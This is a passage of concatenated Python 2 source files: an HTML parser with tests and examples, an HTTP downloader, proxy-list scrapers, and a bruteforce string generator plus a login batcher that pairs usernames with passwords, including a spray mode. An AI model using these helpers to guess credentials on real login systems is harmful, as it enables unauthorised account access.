			if end_tag_too and end_tag == e and end_tag is not None:
				self.childs.remove(e)
			else:
				e.removeChild(child, end_tag_too)

	#* /Setters ****************************************************************



def closeElements(childs):
	"Close tags - used in some constructors"

	o = []

	# Close all unclosed pair tags
	for e in childs:
		if e.isTag():
			if not e.isNonPairTag() and not e.isEndTag() and not e.isComment() and e.endtag is None:
				e.childs = closeElements(e.childs)

				o.append(e)
				o.append(HTMLElement("</" + e.getTagName() + ">"))

				# Join opener and endtag
				e.endtag = o[-1]
				o[-1].openertag = e
			else:
				o.append(e)
		else:
			o.append(e)

	return o



def __raw_split(itxt):
	"""
	Parse HTML from text into array filled with tags end text.

	Source code is little bit unintutive, because it is simple parser machine.
	For better understanding, look at;
	http://kitakitsune.org/images/field_parser.png
	"""
	echr = ""
	buff = ["", "", "", ""]
	content = ""
	array = []
	next_state = 0
	inside_tag = False

	for c in itxt:
		if next_state == 0:  # content
			if c == "<":
				if len(content) > 0:
					array.append(content)
				content = c
				next_state = 1
				inside_tag = False
			else:
				content += c
		elif next_state == 1:  # html tag
			if c == ">":
				array.append(content + c)
				content = ""
				next_state = 0
			elif c == "'" or c == '"':
				echr = c
				content += c
				next_state = 2
			elif c == "-" and buff[0] == "-" and buff[1] == "!" and buff[2] == "<":
				if len(content[:-3]) > 0:
					array.append(content[:-3])
				content = content[-3:] + c
				next_state = 3
			else:
				if c == "<":  # jump back into tag instead of content
					inside_tag = True
				content += c
		elif next_state == 2:  # "" / ''
			if c == echr and (buff[0] != "\\" or (buff[0] == "\\" and buff[1] == "\\")):
				next_state = 1
			content += c
		elif next_state == 3:  # html comments
			if c == ">" and buff[0] == "-" and buff[1] == "-":
				if inside_tag:
					next_state = 1
				else:
					next_state = 0
				inside_tag = False

				array.append(content + c)
				content = ""
			else:
				content += c

		# rotate buffer
		buff = rotate_buff(buff)
		buff[0] = c

	if len(content) > 0:
		array.append(content)

	return array



def __repair_tags(raw_input):
	"""
	Repair tags with comments (<HT<!-- asad -->ML> is parsed to
	["<HT", "<!-- asad -->", "ML>"]	and I need ["<HTML>", "<!-- asad -->"])
	"""
	ostack = []

	index = 0
	while index < len(raw_input):
		el = raw_input[index]

		if el.isComment():
			if index > 0 and index < len(raw_input) - 1:
				if raw_input[index - 1].tagToString().startswith("<") and raw_input[index + 1].tagToString().endswith(">"):
					ostack[-1] = HTMLElement(ostack[-1].tagToString() + raw_input[index + 1].tagToString())
					ostack.append(el)
					index += 1
					continue

		ostack.append(el)

		index += 1

	return ostack



def __indexOfEndTag(istack):
	"""
	Go through istack and search endtag. Element at first index is considered as
	opening tag.

	Returns: index of end tag or 0 if not found.
	"""
	if len(istack) <= 0:
		return 0

	if not istack[0].isOpeningTag():
		return 0

	opener = istack[0]
	cnt = 0

	index = 0
	for el in istack[1:]:
		if el.isOpeningTag() and (el.getTagName().lower() == opener.getTagName().lower()):
			cnt += 1
		elif el.isEndTagTo(opener):
			if cnt == 0:
				return index + 1
			else:
				cnt -= 1

		index += 1

	return 0



def __parseDOM(istack):
	"Recursively go through element array and create DOM."
	ostack = []
	end_tag_index = 0

	index = 0
	while index < len(istack):
		el = istack[index]

		end_tag_index = __indexOfEndTag(istack[index:])  # Check if this is pair tag

		if not el.isNonPairTag() and end_tag_index == 0 and not el.isEndTag():
			el.isNonPairTag(True)

		if end_tag_index != 0:
			el.childs = __parseDOM(istack[index + 1: end_tag_index + index])
			el.endtag = istack[end_tag_index + index]  # Reference to endtag
			el.endtag.openertag = el
			ostack.append(el)
			ostack.append(el.endtag)
			index = end_tag_index + index
		else:
			if not el.isEndTag():
				ostack.append(el)

		index += 1

	return ostack



def parseString(txt):
	"""
	Parse given string and return DOM tree consisting of single linked
	HTMLElements.
	"""
	istack = []

	# remove UTF BOM (prettify fails if not)
	if len(txt) > 3 and txt.startswith("\xef\xbb\xbf"):
		txt = txt[3:]

	for el in __raw_split(txt):
		istack.append(HTMLElement(el))

	container = HTMLElement()
	container.childs = __parseDOM(__repair_tags(istack))

	return container



def makeDoubleLinked(dom, parent = None):
	"""
	Standard output from dhtmlparser is single-linked tree. This will make it 
	double-linked.
	"""
	dom.parent = parent

	if len(dom.childs) > 0:
		for child in dom.childs:
			child.parent = dom
			makeDoubleLinked(child, dom)



#==============================================================================
#= Main program ===============================================================
#==============================================================================
if __name__ == "__main__":
	print "Testing.."

	assert unescape(r"""\' \\ \" \n""")      == r"""\' \\ " \n"""
	assert unescape(r"""\' \\ \" \n""", "'") == r"""' \\ \" \n"""
	assert unescape(r"""\' \\" \n""")        == r"""\' \\" \n"""
	assert unescape(r"""\' \\" \n""")        == r"""\' \\" \n"""
	assert unescape(r"""printf(\"hello \t world\");""") == r"""printf("hello \t world");"""

	assert escape(r"""printf("hello world");""") == r"""printf(\"hello world\");"""
	assert escape(r"""'""", "'") == r"""\'"""

	dom = parseString("""
		"<div Id='xe' a='b'>obsah xe divu</div> <!-- Id, not id :) -->
		 <div id='xu' a='b'>obsah xu divu</div>
	""")

	# find test
	divXe = dom.find("div", {"id":"xe"})[0]
	divXu = dom.find("div", {"id":"xu"})[0]

	# assert divXe.tagToString() == """<div a="b" id="xe">"""
	# assert divXu.tagToString() == """<div a="b" id="xu">"""

	# unit test for toString
	assert divXe.toString() == """<div a="b" Id="xe">obsah xe divu</div>"""
	assert divXu.toString() == """<div a="b" id="xu">obsah xu divu</div>"""

	# getTagName() test
	assert divXe.getTagName() == "div"
	assert divXu.getTagName() == "div"

	# isComment() test
	assert divXe.isComment() == False
	assert divXe.isComment() == divXu.isComment()

	assert divXe.isNonPairTag() != divXe.isOpeningTag()

	assert divXe.isTag() is True
	assert divXe.isTag() == divXu.isTag()

	assert divXe.getContent() == "obsah xe divu"

	# find()/findB() test
	dom = parseString("""
		<div id=first>
			First div.
			<div id=first.subdiv>
				Subdiv in first div.
			</div>
		</div>
		<div id=second>
			Second.
		</div>
	""")

	assert dom.find("div")[1].getContent().strip() == "Subdiv in first div."
	assert dom.findB("div")[1].getContent().strip() == "Second."

	print "Everything ok."
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
import dhtmlparser as d

s = """
<root>
	<object1>Content of first object</object1>
	<object2>Second objects content</object2>
</root>
"""

dom = d.parseString(s)

print dom
print "---\nRemove all <object1>:\n---\n"

# remove all <object1>
for e in dom.find("object1"):
	dom.removeChild(e)


print dom.prettify()


#* Prints: *********************************************************************
"""
<root>
	<object1>Content of first object</object1>
	<object2>Second objects content</object2>
</root>

---
Remove all <object1>:
---

<root>
  <object2>Second objects content</object2>
</root>
"""
#*******************************************************************************#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
from dhtmlparser import *

# if inside container (or other tag), create endtag automatically
print HTMLElement([
	HTMLElement("<xe>")
])
"""
Writes:

<xe>
</xe>
"""

#-------------------------------------------------------------------------------

# if not inside container, elements are left unclosed 
print HTMLElement("<xe>")
"""
Writes only:

<xe>
"""#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
DHTMLParserPy example how to find every link in document.
"""

import urllib
import dhtmlparser

f = urllib.urlopen("http://google.com")
data = f.read()
f.close()

dom = dhtmlparser.parseString(data)

for link in dom.find("a"):
	if "href" in link.params:
		print link.params["href"]#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
from dhtmlparser import *

foo = HTMLElement("<xe one='param'>")
baz = HTMLElement('<xe one="param">')

assert foo != baz # references are not the same
assert foo.isAlmostEqual(baz)#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# DHTMLParser DOM creation example.
from dhtmlparser import *

e = HTMLElement("root", [
		HTMLElement("item", {"param1":"1", "param2":"2"}, [
			HTMLElement("<crap>", [
				HTMLElement("hello parser!")
			]),
			HTMLElement("<another_crap/>", {"with" : "params"}),
			HTMLElement("<!-- comment -->")
		]),
		HTMLElement("<item />", {"blank" : "body"})
	])

print e.prettify()

"""
Writes:

<root>
  <item param2="2" param1="1">
    <crap>hello parser!</crap>
    <another_crap with="params" />
    <!-- comment -->
  </item>
  <item blank="body" />
</root>
"""
#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
Proxy parser for http://www.ip-adress.com.

by Bystroushaak bystrousak@kitakitsune.org
"""
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import httpkie
import dhtmlparser



#= Functions & objects ========================================================
def getProxies():
	"""
	Return array of dicts following this structure:
	{
		ip: str(ip),
		port: int(port),
		type: str(Elite/Anonymous/etc..),
		country: str(country_name),
		ping: -1 # yeah, there is no ping information, this is just for compatibility
	}
	"""
	down = httpkie.Downloader()
	down.headers["Referer"] = "http://www.ip-adress.com/proxy_list/"

	dom = dhtmlparser.parseString(
		down.download("http://www.ip-adress.com/proxy_list/")
	)

	proxies = []
	for tr in dom.find("table", {"class": "proxylist"})[0].find("tr")[2:-1]:
		ip, port = tr.find("td")[0].getContent().split(":")
		proxy_type = tr.find("td")[1].getContent()

		country = tr.find("td")[2]
		country.find("img")[0].replaceWith(dhtmlparser.HTMLElement(""))
		country = country.getContent().strip()

		proxies.append({
			"ip": ip,
			"port": int(port),
			"type": proxy_type,
			"country": country,
			"ping": -1
		})

	return proxies



#= Main program ===============================================================
if __name__ == '__main__':
	import json
	print json.dumps(getProxies())
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Easy to use downloader library based on urllib/urllib2
by Bystroushaak (bystrousak@kitakitsune.org)

This work is licensed under a Creative Commons Licence
(http://creativecommons.org/licenses/by/3.0/cz/).
"""
# Imports =====================================================================
import urllib
import urllib2



# Variables ===================================================================
# IE 7/Windows XP headers.
IEHeaders = {
	"User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}
# Linux ubuntu x86_64 Firefox 23 headers
LFFHeaders = {
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:23.0) Gecko/20100101 Firefox/23.0",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}



#= Functions & objects ========================================================
class Downloader():
	"""
	Lightweight class utilizing downloads from internet.

	Main method: .download()

	Important properties:
		.headers
		.response_headers
		.cookies
		.handle_cookies
	"""

	def __init__(self, headers = None, handle_cookies = True, http_proxy = None):
		"""
		You can set:

		headers -- default IEHeaders, but there is also LFFHeaders
		handle_cookies -- set to false if you don't wish to automatically handle cookies
		http_proxy -- 'url:port' describing HTTP proxy
		"""
		self.headers = headers if headers is not None else IEHeaders
		self.response_headers = None

		self.cookies = {}
		self.handle_cookies = True

		self.http_proxy = None
		if http_proxy is not None:
			self.http_proxy = {'http': http_proxy}


	def download(self, url, get = None, post = None, head = None):
		"""
		Parameters:
		url -- set url to download, automatically adds htt:// if not present
		get -- dict with GET parameters 
		post -- dict with POST parameters
		head -- set to True if you wish to use HEAD request. Returns headers from
		server.
		"""
		# POST params
		if post is not None:
			if type(post) != dict:
				raise TypeError("Unknown type of post paramters.")
			post = urllib.urlencode(post)

		# append GET params to url
		if get is not None:
			if type(get) != dict:
				raise TypeError("Unknown type of get paramters.")
			get = urllib.urlencode(get)
			if "?" in url:
				if url[-1] == "&":
					url += get
				else:
					url += "&" + get
			else:
				url += "?" + get

			get = None

		# check if protocol is specified in |url|
		if not "://" in url:
			url = "http://" + url

		if self.handle_cookies:
			self.__setCookies(url)

		# HEAD request support
		url_req = urllib2.Request(url, post, self.headers)
		if head is not None:
			url_req.get_method = lambda: "HEAD"

		# http proxy support
		opener = None
		if self.http_proxy is None:
			opener = urllib2.build_opener()
		else:
			opener = urllib2.build_opener(urllib2.ProxyHandler(self.http_proxy))

		# download page and save headers from server
		f = opener.open(url_req)
		data = f.read()
		self.response_headers = f.info().items()
		f.close()

		if self.handle_cookies:
			self.__readCookies(url)

		# i suppose I could fix __readCookies() to use dict, but .. meh
		self.response_headers = dict(self.response_headers)

		# head doesn't have content, so return just response headers
		if head is not None:
			return self.response_headers

		return data


	def __setCookies(self, url):
		# add cokies into headers
		domain = self.__getDomain(url)
		if domain in self.cookies.keys():
			cookie_string = ""
			for key in self.cookies[domain].keys():
				cookie_string += key + "=" + str(self.cookies[domain][key]) + "; "

			self.headers["Cookie"] = cookie_string.strip()


	def __readCookies(self, url):
		# simple (and lame) cookie handling
		# parse "set-cookie" string
		cookie_string = ""
		for c in self.response_headers:
			if c[0].lower() == "set-cookie":
				cookie_string = c[1]

		# parse keyword:values
		tmp_cookies = {}
		for c in cookie_string.split(","):
			cookie = c
			if ";" in c:
				cookie = c.split(";")[0]
			cookie = cookie.strip()

			cookie = cookie.split("=")
			keyword = cookie[0]
			value = "=".join(cookie[1:])

			tmp_cookies[keyword] = value

		# append global variable cookis with new cookies
		if len(tmp_cookies) > 0:
			domain = self.__getDomain(url)

			if domain in self.cookies.keys():
				for key in tmp_cookies.keys():
					self.cookies[domain][key] = tmp_cookies[key]
			else:
				self.cookies[domain] = tmp_cookies

		# check for blank cookies
		if len(self.cookies) > 0:
			for domain in self.cookies.keys():
				for key in self.cookies[domain].keys():
					if self.cookies[domain][key].strip() == "":
						del self.cookies[domain][key]

				if len(self.cookies[domain]) == 0:
					del self.cookies[domain]


	def __getDomain(self, url):
		"""
		Parse domain from url.
		"""
		if "://" in url:
			url = url.split("://")[1]

		if "/" in url:
			url = url.split("/")[0]

		return url
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from httpkie import *#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
Proxy parser for http://hidemyass.com/proxy-list/.

by Bystroushaak bystrousak@kitakitsune.org
"""
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import httpkie
import dhtmlparser as d



#= Variables ==================================================================
_POST_DATA = {
	"ac": "on",
	"c[]": "Netherlands",
	"p": "",
	"pr[]": "0",
	"a[]": "4",
	"pl": "on",
	"sp[]": "3",
	"ct[]": "3",
	"s": "0",
	"o": "0",
	"pp": "1",
	"sortBy": "date",
}



#= Functions & objects ========================================================
def __cleanThatShit(shit):
	visible = []

	# find all styles and parse visible class atributes
	for el in shit.find("", fn = lambda x: x.isTag()):
		styles = el.find("style")
		if len(styles) >= 1:
			style_string = ""
			for style in styles:
				style_string += style.getContent() + "\n"
				style.replaceWith(d.parseString(""))
			styles = map(lambda x: x.strip(), style_string.splitlines())
			styles = filter(lambda x: len(x) > 0 and "none" not in x, styles)
			visible += map(lambda x: x[1:].split("{")[0], styles)

	# remove invisible elements
	for el in shit.find("", fn = lambda x: x.isTag()):
		# remove display:none elements
		if "style" in el.params and "none" in el.params["style"]:
			el.replaceWith(d.parseString(""))

		# remove elements with invisible styles
		if "class" in el.params:
			if not el.params["class"].isdigit() and el.params["class"] not in visible:
				el.replaceWith(d.parseString(""))

	return shit


def __shitToIP(shit):
	shit = str(shit)

	content = ""
	for crap in shit.split(">"):
		crap = crap.split("<")[0]

		if crap == ".":
			content += "."
			continue

		if crap.isdigit() or crap.replace(".", "").isdigit():
			content += crap

	return content



def __getProxies(pp):
	down = httpkie.Downloader()

	_POST_DATA["pp"] = pp

	dom = d.parseString(
		down.download(
			"http://hidemyass.com/proxy-list/search-231187",
			post = _POST_DATA
		)
	)


	proxies = []
	for tr in dom.find("table")[0].find("tr")[1:]:
		country = tr.find("td")[3].find("span")[0].getContent()
		country = country.split("/>")[-1].strip()

		proxy = {
			"ip": __shitToIP(__cleanThatShit(tr.find("td")[1])),
			"port": tr.find("td")[2].getContent().strip(),
			"ping": int(tr.find("td")[5].find("div")[0].params["rel"]),
			"country": country
		}

		proxies.append(proxy)

	return proxies


def getProxies():
	"""
	Return array of dicts following this structure:
	{
		ip: str(ip),
		port: int(port),
		country: str(country_name),
		ping: int(something numeric, but probably not exactly milliseconds)
	}
	"""
	return __getProxies(1) + __getProxies(3)


#= Main program ===============================================================
if __name__ == '__main__':
	import json
	print json.dumps(getProxies())
#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
Bruteforce generator
by Bystroushaak (bystrousak@kitakitsune.org
"""
# Interpreter version: python 2.7
#


def bruteforce(seed, length, use_all = False, start_with = ""):
	"""
	Bruteforce generator - TODO: dodělat
	"""
	if isinstance(seed, str):
		seed = list(seed)

	first = seed[0]
	last  = seed[-1]

	shifted_seed = seed[1:] + [first]

	# create lookup table from shifted_seed
	lookup_table = dict(zip(seed, shifted_seed))
	lookup_table[None] = first

	# initialize cells
	out = [None] * length  # default is array of None cells
	if use_all:
		out = [first] * length
		out[-1] = None
	if start_with != "":
		out = list(start_with)

	# check if length is not longer than input seed
	if len(out) > length:
		raise ValueError("'start_with' is longer than 'lengt' keyword!")

	# check if all items from 'start_with' are in 'seed'
	diff = set(start_with) - set(lookup_table.values())
	if len(diff) > 0:
		raise ValueError(
			"'start_with' is using things which aren't in 'seed': " + 
			str(list(diff))
		)

	# iterate until every cell is equal to 'last' variable
	while not all(map(lambda x: x == last, out)):
		# carry shift?
		if out[-1] == last:
			carry = True
			for i in range(length - 1, 0, -1):
				if carry:
					out[i - 1] = lookup_table[out[i - 1]]
				else:
					break
				carry = (out[i - 1] == last)

		out[-1] = lookup_table[out[-1]]

		yield out
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import docopt
import batcher
import permutator#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""

by Bystroushaak (bystrousak@kitakitsune.org
"""
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
from collections import namedtuple



#= Variables ==================================================================
Login = namedtuple("Login", "username password")



#= Functions & objects ========================================================
def batcher(users, passwords, length = 20, cycle_users = False, 
	        user_start = None, pass_start = None):
	"""
	Return array of Logins (named tuple (username, password)).

	If 'cycle_users' is set, use same password to all users before trying
	another password.

	users -- list of users
	passwords -- list of passwords (use iterator for long pasword lists)
	length -- how much Logins emit on each iteration
	cycle_users -- False = try all passwords to given username, True = try all
	               usernames to given password
	"""
	if cycle_users:
		users, passwords = passwords, users
		user_start, pass_start = pass_start, user_start

	username_found = True if user_start is None else False
	password_found = True if pass_start is None else False
	for username in users:
		if not username_found and user_start != username:
			continue
		username_found = True

		logins = []
		for password in passwords:
			if not password_found and pass_start != password:
				continue
			password_found = True

			login = None
			if cycle_users:
				login = Login(password, username)
			else:
				login = Login(username, password)
			logins.append(login)

			if len(logins) % length == 0:
				yield logins
				logins = []

		if len(logins) > 0:
			yield logins



#= Main program ===============================================================
if __name__ == '__main__':
	for login in batcher(["jenda", "tonda", "franta"], [1, 2, 3], 3, True):
		print login
		print "---"
"""Pythonic command-line interface parser that will make you smile.

 * http://docopt.org
 * Repository and issue-tracker: https://github.com/docopt/docopt
 * Licensed under terms of MIT license (see LICENSE-MIT)
 * Copyright (c) 2013 Vladimir Keleshev, vladimir@keleshev.com

"""
import sys
import re


__all__ = ['docopt']
__version__ = '0.6.1'


class DocoptLanguageError(Exception):

    """Error in construction of usage-message by developer."""


class DocoptExit(SystemExit):

    """Exit in case user invoked program with incorrect arguments."""

    usage = ''

    def __init__(self, message=''):
        SystemExit.__init__(self, (message + '\n' + self.usage).strip())


class Pattern(object):

    def __eq__(self, other):
        return repr(self) == repr(other)

    def __hash__(self):
        return hash(repr(self))

    def fix(self):
        self.fix_identities()
        self.fix_repeating_arguments()
        return self

    def fix_identities(self, uniq=None):
        """Make pattern-tree tips point to same object if they are equal."""
        if not hasattr(self, 'children'):
            return self
        uniq = list(set(self.flat())) if uniq is None else uniq
        for i, child in enumerate(self.children):
            if not hasattr(child, 'children'):
                assert child in uniq
                self.children[i] = uniq[uniq.index(child)]
            else:
                child.fix_identities(uniq)

    def fix_repeating_arguments(self):
        """Fix elements that should accumulate/increment values."""
        either = [list(child.children) for child in transform(self).children]
        for case in either:
            for e in [child for child in case if case.count(child) > 1]:
                if type(e) is Argument or type(e) is Option and e.argcount:
                    if e.value is None:
                        e.value = []
                    elif type(e.value) is not list:
                        e.value = e.value.split()
                if type(e) is Command or type(e) is Option and e.argcount == 0:
                    e.value = 0
        return self


def transform(pattern):
    """Expand pattern into an (almost) equivalent one, but with single Either.

    Example: ((-a | -b) (-c | -d)) => (-a -c | -a -d | -b -c | -b -d)
    Quirks: [-a] => (-a), (-a...) => (-a -a)

    """
    result = []
    groups = [[pattern]]
    while groups:
        children = groups.pop(0)
        parents = [Required, Optional, OptionsShortcut, Either, OneOrMore]
        if any(t in map(type, children) for t in parents):
            child = [c for c in children if type(c) in parents][0]
            children.remove(child)
            if type(child) is Either:
                for c in child.children:
                    groups.append([c] + children)
            elif type(child) is OneOrMore:
                groups.append(child.children * 2 + children)
            else:
                groups.append(child.children + children)
        else:
            result.append(children)
    return Either(*[Required(*e) for e in result])


class LeafPattern(Pattern):

    """Leaf/terminal node of a pattern tree."""

    def __init__(self, name, value=None):
        self.name, self.value = name, value

    def __repr__(self):
        return '%s(%r, %r)' % (self.__class__.__name__, self.name, self.value)

    def flat(self, *types):
        return [self] if not types or type(self) in types else []

    def match(self, left, collected=None):
        collected = [] if collected is None else collected
        pos, match = self.single_match(left)
        if match is None:
            return False, left, collected
        left_ = left[:pos] + left[pos + 1:]
        same_name = [a for a in collected if a.name == self.name]
        if type(self.value) in (int, list):
            if type(self.value) is int:
                increment = 1
            else:
                increment = ([match.value] if type(match.value) is str
                             else match.value)
            if not same_name:
                match.value = increment
                return True, left_, collected + [match]
            same_name[0].value += increment
            return True, left_, collected
        return True, left_, collected + [match]


class BranchPattern(Pattern):

    """Branch/inner node of a pattern tree."""

    def __init__(self, *children):
        self.children = list(children)

    def __repr__(self):
        return '%s(%s)' % (self.__class__.__name__,
                           ', '.join(repr(a) for a in self.children))

    def flat(self, *types):
        if type(self) in types:
            return [self]
        return sum([child.flat(*types) for child in self.children], [])


class Argument(LeafPattern):

    def single_match(self, left):
        for n, pattern in enumerate(left):
            if type(pattern) is Argument:
                return n, Argument(self.name, pattern.value)
        return None, None

    @classmethod
    def parse(class_, source):
        name = re.findall('(<\S*?>)', source)[0]
        value = re.findall('\[default: (.*)\]', source, flags=re.I)
        return class_(name, value[0] if value else None)


class Command(Argument):

    def __init__(self, name, value=False):
        self.name, self.value = name, value

    def single_match(self, left):
        for n, pattern in enumerate(left):
            if type(pattern) is Argument:
                if pattern.value == self.name:
                    return n, Command(self.name, True)
                else:
                    break
        return None, None


class Option(LeafPattern):

    def __init__(self, short=None, long=None, argcount=0, value=False):
        assert argcount in (0, 1)
        self.short, self.long, self.argcount = short, long, argcount
        self.value = None if value is False and argcount else value

    @classmethod
    def parse(class_, option_description):
        short, long, argcount, value = None, None, 0, False
        options, _, description = option_description.strip().partition('  ')
        options = options.replace(',', ' ').replace('=', ' ')
        for s in options.split():
            if s.startswith('--'):
                long = s
            elif s.startswith('-'):
                short = s
            else:
                argcount = 1
        if argcount:
            matched = re.findall('\[default: (.*)\]', description, flags=re.I)
            value = matched[0] if matched else None
        return class_(short, long, argcount, value)

    def single_match(self, left):
        for n, pattern in enumerate(left):
            if self.name == pattern.name:
                return n, pattern
        return None, None

    @property
    def name(self):
        return self.long or self.short

    def __repr__(self):
        return 'Option(%r, %r, %r, %r)' % (self.short, self.long,
                                           self.argcount, self.value)


class Required(BranchPattern):

    def match(self, left, collected=None):
        collected = [] if collected is None else collected
        l = left
        c = collected
        for pattern in self.children:
            matched, l, c = pattern.match(l, c)
            if not matched:
                return False, left, collected
        return True, l, c


class Optional(BranchPattern):

    def match(self, left, collected=None):
        collected = [] if collected is None else collected
        for pattern in self.children:
            m, left, collected = pattern.match(left, collected)
        return True, left, collected


class OptionsShortcut(Optional):

    """Marker/placeholder for [options] shortcut."""


class OneOrMore(BranchPattern):

    def match(self, left, collected=None):
        assert len(self.children) == 1
        collected = [] if collected is None else collected
        l = left
        c = collected
        l_ = None
        matched = True
        times = 0
        while matched:
            # could it be that something didn't match but changed l or c?
            matched, l, c = self.children[0].match(l, c)
            times += 1 if matched else 0
            if l_ == l:
                break
            l_ = l
        if times >= 1:
            return True, l, c
        return False, left, collected


class Either(BranchPattern):

    def match(self, left, collected=None):
        collected = [] if collected is None else collected
        outcomes = []
        for pattern in self.children:
            matched, _, _ = outcome = pattern.match(left, collected)
            if matched:
                outcomes.append(outcome)
        if outcomes:
            return min(outcomes, key=lambda outcome: len(outcome[1]))
        return False, left, collected


class Tokens(list):

    def __init__(self, source, error=DocoptExit):
        self += source.split() if hasattr(source, 'split') else source
        self.error = error

    @staticmethod
    def from_pattern(source):
        source = re.sub(r'([\[\]\(\)\|]|\.\.\.)', r' \1 ', source)
        source = [s for s in re.split('\s+|(\S*<.*?>)', source) if s]
        return Tokens(source, error=DocoptLanguageError)

    def move(self):
        return self.pop(0) if len(self) else None

    def current(self):
        return self[0] if len(self) else None


def parse_long(tokens, options):
    """long ::= '--' chars [ ( ' ' | '=' ) chars ] ;"""
    long, eq, value = tokens.move().partition('=')
    assert long.startswith('--')
    value = None if eq == value == '' else value
    similar = [o for o in options if o.long == long]
    if tokens.error is DocoptExit and similar == []:  # if no exact match
        similar = [o for o in options if o.long and o.long.startswith(long)]
    if len(similar) > 1:  # might be simply specified ambiguously 2+ times?
        raise tokens.error('%s is not a unique prefix: %s?' %
                           (long, ', '.join(o.long for o in similar)))
    elif len(similar) < 1:
        argcount = 1 if eq == '=' else 0
        o = Option(None, long, argcount)
        options.append(o)
        if tokens.error is DocoptExit:
            o = Option(None, long, argcount, value if argcount else True)
    else:
        o = Option(similar[0].short, similar[0].long,
                   similar[0].argcount, similar[0].value)
        if o.argcount == 0:
            if value is not None:
                raise tokens.error('%s must not have an argument' % o.long)
        else:
            if value is None:
                if tokens.current() in [None, '--']:
                    raise tokens.error('%s requires argument' % o.long)
                value = tokens.move()
        if tokens.error is DocoptExit:
            o.value = value if value is not None else True
    return [o]


def parse_shorts(tokens, options):
    """shorts ::= '-' ( chars )* [ [ ' ' ] chars ] ;"""
    token = tokens.move()
    assert token.startswith('-') and not token.startswith('--')
    left = token.lstrip('-')
    parsed = []
    while left != '':
        short, left = '-' + left[0], left[1:]
        similar = [o for o in options if o.short == short]
        if len(similar) > 1:
            raise tokens.error('%s is specified ambiguously %d times' %
                               (short, len(similar)))
        elif len(similar) < 1:
            o = Option(short, None, 0)
            options.append(o)
            if tokens.error is DocoptExit:
                o = Option(short, None, 0, True)
        else:  # why copying is necessary here?
            o = Option(short, similar[0].long,
                       similar[0].argcount, similar[0].value)
            value = None
            if o.argcount != 0:
                if left == '':
                    if tokens.current() in [None, '--']:
                        raise tokens.error('%s requires argument' % short)
                    value = tokens.move()
                else:
                    value = left
                    left = ''
            if tokens.error is DocoptExit:
                o.value = value if value is not None else True
        parsed.append(o)
    return parsed


def parse_pattern(source, options):
    tokens = Tokens.from_pattern(source)
    result = parse_expr(tokens, options)
    if tokens.current() is not None:
        raise tokens.error('unexpected ending: %r' % ' '.join(tokens))
    return Required(*result)


def parse_expr(tokens, options):
    """expr ::= seq ( '|' seq )* ;"""
    seq = parse_seq(tokens, options)
    if tokens.current() != '|':
        return seq
    result = [Required(*seq)] if len(seq) > 1 else seq
    while tokens.current() == '|':
        tokens.move()
        seq = parse_seq(tokens, options)
        result += [Required(*seq)] if len(seq) > 1 else seq
    return [Either(*result)] if len(result) > 1 else result


def parse_seq(tokens, options):
    """seq ::= ( atom [ '...' ] )* ;"""
    result = []
    while tokens.current() not in [None, ']', ')', '|']:
        atom = parse_atom(tokens, options)
        if tokens.current() == '...':
            atom = [OneOrMore(*atom)]
            tokens.move()
        result += atom
    return result


def parse_atom(tokens, options):
    """atom ::= '(' expr ')' | '[' expr ']' | 'options'
             | long | shorts | argument | command ;
    """
    token = tokens.current()
    result = []
    if token in '([':
        tokens.move()
        matching, pattern = {'(': [')', Required], '[': [']', Optional]}[token]
        result = pattern(*parse_expr(tokens, options))
        if tokens.move() != matching:
            raise tokens.error("unmatched '%s'" % token)
        return [result]
    elif token == 'options':
        tokens.move()
        return [OptionsShortcut()]
    elif token.startswith('--') and token != '--':
        return parse_long(tokens, options)
    elif token.startswith('-') and token not in ('-', '--'):
        return parse_shorts(tokens, options)
    elif token.startswith('<') and token.endswith('>') or token.isupper():
        return [Argument(tokens.move())]
    else:
        return [Command(tokens.move())]


def parse_argv(tokens, options, options_first=False):
    """Parse command-line argument vector.

    If options_first:
        argv ::= [ long | shorts ]* [ argument ]* [ '--' [ argument ]* ] ;
    else:
        argv ::= [ long | shorts | argument ]* [ '--' [ argument ]* ] ;

    """
    parsed = []
    while tokens.current() is not None:
        if tokens.current() == '--':
            return parsed + [Argument(None, v) for v in tokens]
        elif tokens.current().startswith('--'):
            parsed += parse_long(tokens, options)
        elif tokens.current().startswith('-') and tokens.current() != '-':
            parsed += parse_shorts(tokens, options)
        elif options_first:
            return parsed + [Argument(None, v) for v in tokens]
        else:
            parsed.append(Argument(None, tokens.move()))
    return parsed


def parse_defaults(doc):
    defaults = []
    for s in parse_section('options:', doc):
        # FIXME corner case "bla: options: --foo"
        _, _, s = s.partition(':')  # get rid of "options:"
        split = re.split('\n[ \t]*(-\S+?)', '\n' + s)[1:]
        split = [s1 + s2 for s1, s2 in zip(split[::2], split[1::2])]
